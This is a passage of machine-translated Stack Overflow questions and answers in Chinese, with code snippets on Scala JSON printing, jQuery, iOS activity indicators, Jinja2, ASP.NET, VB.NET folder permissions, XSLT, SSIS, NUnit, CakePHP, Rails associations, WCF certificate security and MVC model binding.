  override protected def printString(s: String, sb: StringBuilder) {
    @tailrec
    def printEscaped(s: String, ix: Int) {
      if (ix < s.length) {
        s.charAt(ix) match {
          case '"' => sb.append("\\\"")
          case '\\' => sb.append("\\\\")
          case x if 0x20 <= x && x < 0x7F => sb.append(x)
          case '\b' => sb.append("\\b")
          case '\f' => sb.append("\\f")
          case '\n' => sb.append("\\n")
          case '\r' => sb.append("\\r")
          case '\t' => sb.append("\\t")
          case x => sb.append(x)
        }
        printEscaped(s, ix + 1)
      }
    }
    sb.append('"')
    printEscaped(s, 0)
    sb.append('"')
  }
}

trait NoUnicodeEscPrettyPrinter  extends PrettyPrinter with NoUnicodeEscJsonPrinter
object NoUnicodeEscPrettyPrinter extends NoUnicodeEscPrettyPrinter

trait NoUnicodeEscCompactPrinter   extends CompactPrinter  with NoUnicodeEscJsonPrinter
object NoUnicodeEscCompactPrinter  extends NoUnicodeEscCompactPrinter 
```

然后你可以这样做：

```
val json: JsValue = ...
val jsonString: String = NoUnicodeEscPrettyPrinter( json ) 
```

`jsonString`将以漂亮的打印格式包含您的 json 文档，并且没有任何 unicde 转义。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-11-03T17:44:42.697

这个问题似乎在 spray-json 1.3.2 中得到纠正： [https ://github.com/spray/spray-json/issues/46](https://github.com/spray/spray-json/issues/46)

我在使用 Akka HTTP 1.0 时遇到了类似的阿拉伯字符问题，这取决于 1.3.1。通过升级到 1.3.2，我的问题得到了解决。

# javascript - jQuery：判断一个函数是否被调用为一个 jQuery 事件处理程序（回调）

> ID：14853088
> 
> 赞同：4
> 
> 时间：2013-02-13T12:00:18.623
> 
> 标签：javascript, jquery, event-handling

我有一个 JavaScript 函数，可以直接调用，也可以作为 jQuery 事件的回调。

在后一种情况下，jQuery Event 对象将作为参数传递。当我直接调用该函数时，我还提供了一个参数（不同类型，但仍然是一个对象）。

因此，我需要能够检查（在函数体内）函数是如何被调用的，以便知道它正在处理什么样的参数。

有没有一种简单的方法可以做到这一点？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-02-13T12:03:23.367

接受这个论点，然后看看它是否是`instanceof` `jQuery.Event`：

```
function yourFunction(e) {
    if (e instanceof jQuery.Event) {
        // ...it was an event handler call
    }
} 
```

[实例](http://jsbin.com/edehuw/1)| [来源](http://jsbin.com/edehuw/1/edit)

不过，我建议避免这种事情。相反，如果您需要根据调用方式来区分行为，我建议让事件处理程序*调用目标函数（而不是将目标函数用作实际的事件处理程序）。*

根据您对问题的评论：

> 我简单地尝试的是：直接调用函数时，我在第一个位置使用空值，在第二个位置使用有用的参数。

在这种情况下，它更容易：

```
function yourFunction(e) {
    if (e) {
        // ...it was an event handler call -- or at least,
        // a non-falsey argument of some kind was passed in
    }
} 
```

您甚至不必传入`null`函数，只需不带参数调用它即可。当你这样做时，`e`will be `undefined`，这是错误的。（jQuery 传递给处理程序的事件对象永远不会是假的。）

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-02-13T12:02:59.587

在 if 条件中尝试 typeof() 运算符。如果参数类型相同，您可以尝试在任一情况下为传递的对象/事件分配一个唯一属性，然后再次检查该属性...

# iphone - 动画时更改 UIActivityIndi cator 的颜色

> ID：14853098
> 
> 赞同：4
> 
> 时间：2013-02-13T12:00:59.597
> 
> 标签：iphone, ios, objective-c, uiactivityindicatorview

是否可以在 UIActivityIndi​​catorView 仍在动画时更改它的颜色？如果有人有这个问题，那么你可以建议我

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-13T13:06:15.800

我刚刚在视图控制器类中尝试了以下代码，它适用于 iOS 5+

```
#import "ViewController.h"

@interface ViewController ()

@property UIActivityIndicatorView *activityIndicator;

@end

@implementation ViewController

- (void)viewDidLoad
{
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.

    [self.view setBackgroundColor:[UIColor clearColor]];

    _activityIndicator = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleWhiteLarge];
    [_activityIndicator setCenter:self.view.center];

    [self.view addSubview:_activityIndicator];
    [_activityIndicator startAnimating];

    [NSTimer scheduledTimerWithTimeInterval:2.0 target:self selector:@selector(changeColor) userInfo:nil repeats:NO];
}

- (void)changeColor
{
    _activityIndicator.color = [UIColor redColor];
}

@end 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-13T12:07:44.563

我为您找到了一个美丽的链接： [ActivityIndi​​cators](http://www.cocoacontrols.com/search?utf8=%E2%9C%93&q=indicator)

我认为您应该尝试：[自定义活动指示器](http://blog.blackwhale.at/?p=336#more-336)。

您可以从以下任何一项更改[UIActivityIndi​​catorStyle](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIActivityIndicatorView_Class/Reference/UIActivityIndicatorView.html)：

> UIActivityIndi
> ​​catorViewStyleWhiteLarge，UIActivityIndi​​catorViewStyleWhite，UIActivityIndi
> ​​catorViewStyleGray，

希望能帮助到你 ！！！

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-11-20T16:04:15.757

```
refreshSpinner.color = [UIColor colorWithRed:X/255 green:Y/255 blue:Z/255 alpha:1.0]; 
```

否则我认为你`init`的价值是两倍

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-13T12:06:01.513

在 iOS 5.0 及更高版本中，您可以使用 setColor:`UIActivityIndicatorView`设置自定义颜色。

像

```
Activity.color = [UIColor redColor]; 
```

**编辑**：-

试试这个

```
[activityIndicator setBackgroundColor:[UIColor blackColor]]; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-13T12:15:21.063

**可以在 webview 中执行此操作。根据您的视图添加“gif”图像。**

```
NSString *path = [[NSBundle mainBundle] bundlePath];
    NSURL *baseURL = [NSURL fileURLWithPath:path];
    NSString *html2=[NSString stringWithFormat:@"<html><body leftmargin=\"0\"     topmargin=\"0\" marginwidth=\"0\" marginheight=\"0\"><img id=\"img\" src=\"%@\" alt=\"\"  width=\"32\" height=\"32\" ></body><html>",@"loader.gif"];
    [self.web_Loader loadHTMLString:html2 baseURL:baseURL]; 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-02-13T12:42:04.263

```
if([ind isAnimating])
        {
            [ind setColor:[UIColor redColor]];
        } 
```

# python - loop.lenth ins 神社 2

> ID：14853102
> 
> 赞同：0
> 
> 时间：2013-02-13T12:01:10.963
> 
> 标签：python, jinja2

我正在尝试为我的博客格式化标签的显示。我可以列出 tag1、tag2、tag3 等...很好。我什至想出了如何用这个消除最后一个逗号：

```
{% if not forloop.last %}, {% endif %} 
```

我的问题是......我该如何处理“和”？

例如：tag1、tag2 和 tag3。

这是规则

如果两个标签 = 并且没有逗号分隔。如果 3 个或更多标签 = 倒数第二个在列表末尾得到“和”永远不会是逗号或和。

我希望我可以用这样的东西在 jinja2 中创建这些显示规则......

```
{% if loop.index == forloop.last - 1 %}and {% endif %} 
```

当然，这段代码导致

> 引发 TemplateSyntaxError，“'if' 语句格式不正确” TemplateSyntaxError：'if' 语句格式不正确

我感觉有人会告诉我在应用程序中执行此操作；不是模板..但请解释为什么...我应该使用自定义过滤器吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-04T15:58:19.933

建议[从模板中删除尽可能多的逻辑，](http://jinja.pocoo.org/docs/faq/#isn-t-it-a-terrible-idea-to-put-logic-into-templates)以便您可以专注于演示并避免在页面呈现中添加故障点，但总是存在边界情况。

如果您定义一个类似于内置的自定义过滤器，您将保持一个看起来更干净的模板`join`。这是一个接受纯文本标签名称列表并返回字符串的示例：

```
def join_tags(tags):
    if not tags:
        return '(no tags)'
    elif len(tags) == 1:
        return tags[0]
    else:
        return ', '.join(tags[:-1]) + ' and ' + tags[-1]

app.jinja_env.filters['join_tags'] = join_tags 
```

模板使用：

```
{{ tags|join_tags }} 
```

如果您还在过滤器中添加标记，则必须将`safe`过滤器应用于结果，这样它就不会被转义。

# c# - 从javascript调用类文件中的C#方法

> ID：14853103
> 
> 赞同：-1
> 
> 时间：2013-02-13T12:01:12.987
> 
> 标签：c#, javascript, asp.net

是否可以通过javascript调用特定类文件中的C#函数？

我的功能是这样的

```
 public static void PrintPDF()
    {
    } 
```

这个函数在一个类文件`XSLTHelper` 中在 C# 中我可以通过`XSLTHelper.PrintPDF();`. 有没有办法从javascript做同样的事情？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:03:40.547

您可以使用jquery 和Ajax 来调用可以调用PrintPDF 函数的动作方法吗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:04:18.827

您可以使用 Ajax 调用，如下所示：

```
 $.ajax({
      type: "POST",
      url: "PageName.aspx/PrintPDF",
      contentType: "application/json; charset=utf-8",
      dataType: "json",

      success: function (msg) {
           if (msg.d == 'Success') {

            }

        }

   }); 
```

您的函数需要具有如下属性：

```
[System.Web.Services.WebMethod] 
```

# vb.net - 创建时授予文件夹完全访问权限

> ID：14853105
> 
> 赞同：3
> 
> 时间：2013-02-13T12:01:32.460
> 
> 标签：vb.net

我有一个情况，我有一个 Windows 应用程序，如果它不存在，它将在服务器上创建文件夹，然后我会将文件复制到它，但目前我在指定路径上被拒绝访问。这就是我所拥有的。

```
If (Not System.IO.Directory.Exists(sdPath & "\DONE")) Then
   System.IO.Directory.CreateDirectory(sdPath & "\DONE")
   sdFileInfo.MoveTo(sdPath & "\DONE\" & sdFileName & sdFileInfo.Extension)
Else
   sdFileInfo.MoveTo(sdPath & "\DONE\" & sdFileName & sdFileInfo.Extension)
End If 
```

如何授予完全访问权限？

我有这段测试代码，看看我是否可以获得权限，但似乎不起作用。

```
txtPath.Text = "\\ServerName\images\dbpics\POLPICS\55\Polpics\Actual\"

Dim sFolderPath As String = txtPath.Text
Dim sUserAccount As String = "(DomainName\Administrator)"

Dim oFolderInfo As IO.DirectoryInfo = New IO.DirectoryInfo(sFolderPath)
Dim oFolderAcl As New DirectorySecurity(txtPath.Text, System.Security.AccessControl.AccessControlSections.Access)

oFolderAcl.AddAccessRule(New FileSystemAccessRule(sUserAccount, _
                                                  FileSystemRights.FullControl, _
                                                  AccessControlType.Allow))

oFolderInfo.SetAccessControl(oFolderAcl)

oFolderAcl = Nothing
oFolderInfo = Nothing
enter code here 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T12:07:27.393

尝试使用：

```
Imports System.Security.AccessControl

 Dim FolderPath As String = "C:\TestingFolder" 'Specify the folder here
 Dim UserAccount As String = "MYDOMAIN\someuser" 'Specify the user here

 Dim FolderInfo As IO.DirectoryInfo = New IO.DirectoryInfo(FolderPath)
 Dim FolderAcl As New DirectorySecurity
 FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.Modify,      InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow))
'FolderAcl.SetAccessRuleProtection(True, False) 'uncomment to remove existing permissions
FolderInfo.SetAccessControl(FolderAcl) 
```

我从这个[网址得到它](http://www.vbforums.com/showthread.php?616021-Setting-file-and-folder-permissions)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T12:16:27.780

您可以将所需的安全性添加到创建它的目录中：

```
System.IO.Directory.CreateDirectory(sFolderPath, dirSecurity) 
```

您可以在MSDN的[CreateDirectory](http://msdn.microsoft.com/en-us/library/9h4z99zb.aspx)和[DirectorySecurity](http://msdn.microsoft.com/en-us/library/system.security.accesscontrol.directorysecurity.aspx)的文档中看到一些权限和示例。

# xslt-1.0 - 选择选项不起作用

> ID：14853107
> 
> 赞同：0
> 
> 时间：2013-02-13T12:01:37.540
> 
> 标签：xslt-1.0

我的构建脚本创建了 4 个不同的 Build 名称

```
STP_13_00_00_00_RC01
STPMON_13_00_00_00_RC01
STPWEB_13_00_00_00_RC01
STPPRODUCTS_13_00_00_00_RC01 
```

所以我希望当脚本创建具有名称的构建时，`**STP_13_00_00_00_RC01**`它应该创建文件夹，然后将 tar 文件复制到该文件夹​​中，然后它应该再创建一个文件夹，而如果构建名称以其他名称 STPMON,STPWEB.STPPRODUCTS 开头，那么它应该只需创建文件夹并复制该文件夹中的 tar 文件所以我使用了以下条件。但是对于所有构建，它都会进入其他条件，要么构建是使用 STP 创建的

```
</xsl:element>
<xsl:element name="gzip">
  <xsl:attribute name="destfile"
    >${archive.base}/${gbl.dist.label}.tar.gz</xsl:attribute>
  <xsl:attribute name="src"
    >${archive.base}/${gbl.dist.label}.tar</xsl:attribute>
</xsl:element>
<xsl:choose>
  <xsl:when test="contains(node,'STP')">
    <xsl:element name="mkdir">
      <xsl:attribute name="dir"
        >/mnt/projects/autoblds_dev_build/blds_dev_stp2build/${gbl.dist.label}</xsl:attribute>
    </xsl:element>
    <xsl:element name="copy">
      <xsl:attribute name="file">${archive.base}/${gbl.dist.label}.tar.gz</xsl:attribute>
      <xsl:attribute name="todir"
        >/mnt/projects/autoblds_dev_build/blds_dev_stp2build/${gbl.dist.label}/</xsl:attribute>
      <xsl:attribute name="overwrite">no</xsl:attribute>
    </xsl:element>
    <xsl:element name="mkdir">
      <xsl:attribute name="dir"
        >/mnt/projects/autoblds_dev_build/blds_dev_stp2build/${soa.release.version}</xsl:attribute>
    </xsl:element>
  </xsl:when>
  <xsl:otherwise>
    <xsl:element name="mkdir">
      <xsl:attribute name="dir"
        >/mnt/projects/autoblds_dev_build/blds_dev_stp2build/${gbl.dist.label}_Test</xsl:attribute>
    </xsl:element>
    <xsl:element name="copy">
      <xsl:attribute name="file"
         >${archive.base}/${gbl.dist.label}.tar.gz</xsl:attribute>
      <xsl:attribute name="todir"
         >/mnt/projects/autoblds_dev_build/blds_dev_stp2build/${gbl.dist.label}_Test/</xsl:attribute>
      <xsl:attribute name="overwrite">no</xsl:attribute>
    </xsl:element>
  </xsl:otherwise>
</xsl:choose> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T22:41:38.840

您的选择指令会根据条件分支

```
contains(node,'STP') 
```

这至少有一个问题，而且可能有两个。

您对问题的描述说您希望对名为 的构建采取一种方式，而对名称以、或 `STP_13_00_00_00_RC01`开头的构建采取不同的方式。但是所有这些构建名称都包含字符串“STP”，因此您的测试条件无法区分它们。换句话说，你的代码不会做你想做的事，因为你没有说出你的意思。`STPMON``STPWEB``STPPRODUCTS`

你说测试永远不会成功（样式表总是在`otherwise`分支）。这表明该表达式`node`没有评估您似乎期望的字符串，也没有评估可能被强制转换为您期望的字符串的文档节点。可能的原因包括：

*   您的 XML 没有名为 的元素`node`。
*   您的 XML 有一个名为 的元素`node`，但它不是引用您的代码的模板的上下文节点的子节点。
*   您的 XML 有一个名为 的元素`node`，它是上下文节点的子节点，但它的字符串值不是构建的名称。

这些都是可能的，但如果我不得不猜测，我猜这是其中的第一个。

# ssis - 我可以在 SSIS 中为连接管理器“别名”或删除重复数据吗？

> ID：14853109
> 
> 赞同：1
> 
> 时间：2013-02-13T12:01:44.173
> 
> 标签：ssis

我制作了多个 SSIS 包并通过将序列容器复制粘贴到单个`dtsx`文件中将它们集成到单个包中

结果，我现在有多个连接管理器都指向相同的 2 个位置（因为它们被每个序列容器复制并重命名）

有没有办法将它们合并在一起，以便我可以仅更改其中一个副本中的连接字符串以反映整个包中的更改？

（我知道我可以手动更改所有任务以使用相同的连接字符串，但想避免这种情况）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T15:06:47.723

您可以将`ConnectionString`多个 ConnectionManager 的属性设置为同一个**变量**。这将允许您更改一次值并将其应用于所有连接。

但是，您仍然需要检查所有 ConnectionManager 并`ConnectionString`手动将它们的属性设置为变量。（当然，除非您想手动编辑 .dtsx 文件，或者编写 .NET 应用程序以编程方式更新包。）删除所有额外的 ConnectionManager 并更新任务和组件可能会更容易手动。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T15:02:55.257

当您将这些连接管理器`ID`粘贴到其中时，它们中的每一个都将获得一个新属性。当它们用于`Execute SQL Tasks`显示连接管理器的友好名称但在工作表下方时，会存储该 GUID。这就是为什么您可以将连接管理器 A 重命名为连接管理器 B，反之亦然，并且任务仍将使用“正确的”CM。

一种允许您继续拥有现有连接管理器但只需要配置 2 个东西的方法是创建 2 个变量，`User::ConnectionManagerAConnectionString`并将`User::ConnectionManagerBConnectionString`这些变量的值分配为包中的实际连接字符串，例如`Data Source=localhost\DEV2012;Initial Catalog=FOO;Provider=SQLNCLI10.1;Integrated Security=SSPI;`

有了这两个变量，然后在每个连接管理器上，右键单击它们并在“属性”窗口中，找到“表达式”并单击省略号。选择`ConnectionString`属性并在表达式中分配您的变量。

![在此处输入图像描述](../Images/dc392b7f7ad243381f9204663a7ab81a.png)

现在，当您的包运行时，所有这些连接管理器都是根据这些表达式配置的。如果您需要更改这些值，您可以编辑包或通过 dtexec 应用运行时配置或使用 SSIS 的配置选项。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T12:03:50.193

据我所知，恐怕您将不得不手动执行此操作。此外，您不希望工作中的 5 个连接管理器都连接到同一个数据库。

# c++ - 在用户关闭 bb10(z10) 应用程序时，需要很长时间才能访问主屏幕上的应用程序图标

> ID：14853112
> 
> 赞同：0
> 
> 时间：2013-02-13T12:01:46.967
> 
> 标签：c++, garbage-collection, blackberry-10, blackberry-qnx

场景是我的应用程序正在使用 web 视图（用于地图的 java 脚本），在用户关闭应用程序时，他必须等待一段时间（主屏幕上的图标图像模糊，表示应用程序尚未准备好）。bb10 操作系统是否处理对象实例的关闭，或者应该在应用程序端处理。据我所知，所有对象实例都在退出时关闭

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-14T08:23:23.813

BB10 问题跟踪器上有一个关于此的错误 - [https://www.blackberry.com/jira/browse/BBTEN-612](https://www.blackberry.com/jira/browse/BBTEN-612)。看起来这仍然存在，除非您使用的是旧的 sdk？

# c++ - 视觉工作室奇怪的行为

> ID：14853114
> 
> 赞同：1
> 
> 时间：2013-02-13T12:01:49.823
> 
> 标签：c++, visual-studio-2010

我在 Visual Studio 2010 中编写了一个 C++ 代码作为我的初中生的示例，看起来像

```
#include <iostream>
using namespace std;
int main()
{
    cout<< "How are Your";
} 
```

如果有人可以为我解释，我不明白这个程序是如何在没有返回语句的情况下构建和执行的？？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-13T12:06:15.327

如果函数中没有 return 语句`main`，则默认为`return 0;`

**§ 3.6.1**

> main 中的 return 语句具有离开 main 函数（销毁具有自动存储持续时间的任何对象）并以返回值作为参数调用 std::exit 的效果。如果控制到达main末尾没有遇到return语句，效果就是执行return 0；

# nunit - NUnit 无法加载文件或程序集'LogAnalyzer

> ID：14853118
> 
> 赞同：1
> 
> 时间：2013-02-13T12:01:55.140
> 
> 标签：nunit

嗨，我刚开始阅读[单元测试的艺术：.Net](https://rads.stackoverflow.com/amzn/click/com/1933988274)中的示例，以了解什么是单元测试以及如何正确编码单元测试。

首先，我认为在书中作者将使用来自 Visual Studio 的集成单元测试工具，我假设它被称为 NUnit。我错了，但没问题，因为单元测试的原则在两者中应该是相同的（正确如果我错了我）

我尝试在我的 PC 上安装 NUnit，女巫安装了 x64 Windows 8。这是我要测试的代码：

```
 public class LogAnalyzer {
    public bool IsValidLogFileName(string fileName) {
        if (!fileName.EndsWith(".slf")) {
            return false;
        }
        return true;
    }
} 
```

这是进行测试的代码：

```
[TestFixture]
public class LogAnalyzerTests {
    [Test]
    public void IsValidFileName_validFileLowerCased_ReturnsTrue() {
        LogAnalyzer analyzer = new LogAnalyzer();
        bool result = analyzer.IsValidLogFileName("whatever.slf");
        Assert.IsTrue(result, "filename should be valid");
    }
} 
```

当我尝试在 NUnit GUI 中加载测试的 dll 并运行它时，我收到以下错误：

```
LogAnalyzerTests.LogAnalyzerTests.IsValidFileName_validFileLowerCased_ReturnsTrue: 
```

System.BadImageFormatException：无法加载文件或程序集“LogAnalyzer，版本=1.0.0.0，Culture=neutral，PublicKeyToken=null”或其依赖项之一。试图加载格式不正确的程序。

这是我安装 NUnit 后遵循的步骤：

1.  创建班级项目
2.  添加对被测试项目的引用
3.  添加对 NUnit 的引用
4.  打开 NUnit 图形用户界面
5.  从调试文件夹加载 NUnitClassLibrarry.dll
6.  运行（这是出现错误的地方）

我做错了什么，我该如何解决？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:51:08.097

我设法找到了解决我当前问题的方法，但我不完全理解为什么会这样。在安装 NUnit 的文件夹中，有一个 x86 版本的程序，出于某种原因，这个可以工作。

# javascript - 如何防止 HtmlHelper 转义 URL 部分

> ID：14853119
> 
> 赞同：2
> 
> 时间：2013-02-13T12:01:59.687
> 
> 标签：javascript, templates, cakephp

使用 CakePHP 2.2，我想在视图中生成以下链接：

```
<a href="/teams/edit/${$data.Team.id}">Edit</a> 
```

这个标记后来被 Javascript 模板引擎拾取，因此是`${$data.Team.id}`部分。

这显然是我的第一次尝试：

```
echo $this->Html->link(
    'Edit',
    array('controller' => 'teams', 'action'=>'edit', '${$data.Team.id}')
); 
```

结果：

```
<a href="/teams/edit/%24%7B%24data.Team.id%7D">Edit</a> 
```

`$`, `{`, 和`}`很好的 URL 编码 - 我不想要。

好的，但是有一个`'escape' => false`选择，[The Book](http://book.cakephp.org/2.0/en/core-libraries/helpers/html.html#HtmlHelper%3a%3alink)说。

```
echo $this->Html->link(
    'Edit',
    array('controller' => 'teams', 'action'=>'edit', '${$data.Team.id}'),
    array('escape' => false)
); 
```

结果不变。显然，参数仅影响URL 数组键中`'escape'`实际查询字符串的处理。`'?'`

如何使用 HtmlHelper 达到预期的效果？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T14:33:53.237

没有办法达到你想要的。路由器将对所有命名和传递的参数进行urlencode。您可以使用`HtmlHelper::url()`来生成`/teams/edit/`零件，然后使用简单的字符串连接。

编辑：您可能可以使用自定义 RouteClass 并覆盖进行编码的 CakeRoute::_writeUrl() 方法。在 url 数组中传递一个特殊的参数来告诉它不编码并取消设置该参数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-24T03:39:27.743

I ended up creating my own helper for this and not using the link helper. In my helper, I used the url helper to generate the base url, then I appended my desired parameters.

# jquery - 添加类而不是内联样式

> ID：14853130
> 
> 赞同：1
> 
> 时间：2013-02-13T12:02:34.293
> 
> 标签：jquery, jquery-ui, jquery-plugins

我为内联样式编写的以下代码，而不是我需要使用 jquery .addClass 方法从不同的 .css 文件中提供类。我怎样才能做到这一点？

```
$(keywords).each(function(){                 
        var pattern = new RegExp("("+this+")", ["i"]);              
        var rs = "<span style='background-color:#FF6666;font-weight:bold'>$1</span>";  
        if(el.length > 0){
            el.html(el.html().replace(pattern, rs));
        }

    }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:04:52.007

```
$(keywords).each(function(el){                 
     $(el).addClass('yourClass');
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:08:01.467

如果您需要为新创建的 span 元素设置样式，只需替换`style="..."`为`class="className"`，无需使用 addClass

```
$(keywords).each(function(){                 
        var pattern = new RegExp("("+this+")", ["i"]);              
        var rs = "<span class="class">$1</span>";  
        if(el.length > 0){
            el.html(el.html().replace(pattern, rs));
        }
    }); 
```

或者，如果您必须将类设置为不同的对象，只需执行

```
$("selector").addClass("className") 
```

# ruby-on-rails - Ruby on Rails 数据建模

> ID：14853131
> 
> 赞同：0
> 
> 时间：2013-02-13T12:02:40.150
> 
> 标签：ruby-on-rails, rails-activerecord

我有一个具有以下架构的用户表：

`User -- id , name , age etc`

和具有以下架构的 Ride 表：

`Ride -- id , from , to etc.`

我还有一个带有架构的 Bookings 表：
`Booking - id, User_id, Ride_id`

有什么方法可以描述有关乘车的详细信息`from , to etc`以及有关进行预订的用户的详细信息？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:40:39.613

假设你有以下关系：

```
class User < ActiveRecord::Base
  has_many :bookings
  has_many :rides, :through => :bookings
end

class Booking < ActiveRecord::Base
  belongs_to :user
  belongs_to :ride
end

class Ride < ActiveRecord::Base
  has_many :bookings
  has_many :users, :through => :bookings
end 
```

您可以检索任何您想要的信息。

```
booking = Booking.find(1)
booking.user.name
=> #return user name
booking.ride.from
=> #return ride from
etc 
```

此外，`:through`允许您`user`直接访问，`ride`反之亦然：

```
user = User.find(1)
user.rides
=> #return all rides for that user 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:37:11.213

创建模型用户、乘车和预订。然后你可以使用`booking.ride.from`, `user.bookings.last.ride.to`。这一切都在这里解释[http://guides.rubyonrails.org/association_basics.html](http://guides.rubyonrails.org/association_basics.html)。

# wcf - 客户端身份验证方案“匿名”禁止 HTTP 请求

> ID：14853135
> 
> 赞同：8
> 
> 时间：2013-02-13T12:02:53.943
> 
> 标签：wcf, security, https, certificate, transport-security

这似乎是一个常见问题，我已经查看了这里的所有答案，但没有任何帮助。

我试图让 SSL 与托管在 iis 上的 basichttpbinding 和 WCF 服务一起使用。我认为问题出在 iis 或证书上。我在 iis 管理器中创建了一个自签名证书。我的证书被称为“mycomputer”，并且也被置于受信任的根证书之下。客户端找到证书没有问题。

我在 iis 中的设置是启用匿名身份验证，并禁用其他所有功能。还需要 SSL 并接受客户端证书。那是对的吗？如果我选择忽略，我会收到错误消息。

我看不出我的配置有什么问题，这些正确吗？

服务配置：

```
<system.serviceModel>
<services> 
  <service behaviorConfiguration="MyBehaviour" name="BasicHttpSecTest.Service1"> 
    <endpoint name="MyEndPoint" address="https://mycomputer/wp/" binding="basicHttpBinding" bindingConfiguration="ClientCertificateTransportSecurity" contract="BasicHttpSecTest.IService1" /> 
    <!--<endpoint address="mex" binding="mexHttpsBinding" contract="IMetadataExchange" />-->
  </service> 
</services> 
<behaviors> 
  <serviceBehaviors> 
    <behavior name="MyBehaviour"> 
      <serviceMetadata httpsGetEnabled="true" /> 
      <serviceDebug includeExceptionDetailInFaults="true" /> 
      <serviceCredentials>
        <clientCertificate>
          <authentication certificateValidationMode="PeerOrChainTrust" revocationMode="NoCheck"/>
        </clientCertificate>
      </serviceCredentials>
    </behavior> 
  </serviceBehaviors> 
</behaviors> 
<bindings> 
  <basicHttpBinding> 
    <binding name="ClientCertificateTransportSecurity"> 
      <security mode="Transport"> 
        <transport clientCredentialType="Certificate" />
      </security> 
    </binding> 
  </basicHttpBinding> 
</bindings>
</system.serviceModel> 
```

客户端配置：

```
<system.serviceModel> 
<client>
    <endpoint address="https://mycomputer/wp/Service1.svc" binding="basicHttpBinding"
        bindingConfiguration="MyEndPoint" contract="ServiceSSLref.IService1"
        name="MyEndPoint1" behaviorConfiguration="ClientCertificateCredential"/>
</client>

<bindings>
    <basicHttpBinding>
        <binding name="MyEndPoint">
            <security mode="Transport">
                <transport clientCredentialType="Certificate" />
            </security>
        </binding>
    </basicHttpBinding>
</bindings>

<behaviors> 
  <endpointBehaviors> 
    <behavior name="ClientCertificateCredential"> 
      <clientCredentials> 
        <clientCertificate findValue="mycomputer" storeLocation="LocalMachine" storeName="My" x509FindType="FindByIssuerName" />
        <serviceCertificate>
          <authentication certificateValidationMode="PeerOrChainTrust" revocationMode="NoCheck"/>
        </serviceCertificate>
      </clientCredentials> 
    </behavior> 
  </endpointBehaviors> 
</behaviors>
</system.serviceModel> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-13T12:42:07.637

我想您的问题可能出在您的客户端证书中。设置 clientCredentialType="Certificate" 您告诉 WCF，客户端必须指定服务器信任的证书。据我了解，您只有服务器端生成的证书。尝试设置

```
 <transport clientCredentialType="None" /> 
```

这将允许您在不需要服务器信任的证书的情况下发送消息。或者您可以尝试在客户端生成证书并将其放入服务器上的 Trusted 文件夹中。也许这种状态会帮助你[http://msdn.microsoft.com/en-us/library/ms731074.aspx](http://msdn.microsoft.com/en-us/library/ms731074.aspx)

# asp.net-mvc-3 - MVC 3 ModelBinding 到具有 ModelBinderAttribute 的集合

> ID：14853138
> 
> 赞同：0
> 
> 时间：2013-02-13T12:02:59.143
> 
> 标签：asp.net-mvc-3, model-binding

是否可以使用 绑定到集合`ModelBinderAttribute`？

这是我的操作方法参数：

```
[ModelBinder(typeof(SelectableLookupAllSelectedModelBinder))] List<SelectableLookup> classificationItems 
```

这是我的自定义模型绑定器：

```
public class SelectableLookupAllSelectedModelBinder : IModelBinder
{
    public object BindModel(ControllerContext controllerContext, ModelBindingContext bindingContext)
    {
        var model = bindingContext.Model as SelectableLookup ??
                             (SelectableLookup)DependencyResolver.Current.GetService(typeof(SelectableLookup));

        model.UId = int.Parse(bindingContext.ValueProvider.GetValue(bindingContext.ModelName).AttemptedValue);
        model.InitialState = true;
        model.SelectedState = true;

        return model;
    }
} 
```

这是此参数的已发布 JSON 数据：

`"classificationItems":["19","20","21","22"]}`

以下是 ValueProvider 的看法：

`viewModel.classificationItems[0]`AttemptedValue = "19" `viewModel.classificationItems[1]`AttemptedValue = "20" `viewModel.classificationItems[2]`AttemptedValue = "21" `viewModel.classificationItems[3]`AttemptedValue = "22"

这目前不起作用，因为首先有一个前缀（“viewModel”）我可以整理出来，但其次`bindingContext.ModelName`是“classificationItems”，它是绑定到的参数的名称，而不是列表中的索引项目，即“classificationItems [0]"

我应该补充一点，当我在 global.asax 中将此绑定器声明为全局 ModelBinder 时，它可以正常工作...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T19:33:53.520

